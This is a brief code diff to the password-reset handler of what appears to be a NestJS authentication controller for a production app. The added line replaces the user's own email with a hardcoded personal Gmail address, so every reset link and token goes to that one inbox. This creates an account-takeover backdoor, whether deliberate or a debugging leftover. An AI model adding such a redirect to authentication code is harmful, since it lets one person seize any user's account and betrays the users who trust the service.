@@ -109,7 +109,7 @@ export class AuthController {
         const token = this.authService.generateResetToken(user.id);
 
         const resetLink = `https://gigsters-production.up.railway.app/auth/reset-password?token=${token}`;
-        await this.mailService.sendPasswordResetEmail(user.email, resetLink);
+        await this.mailService.sendPasswordResetEmail("moussanassour1997@gmail.com", resetLink);
       }
 
       @Public()
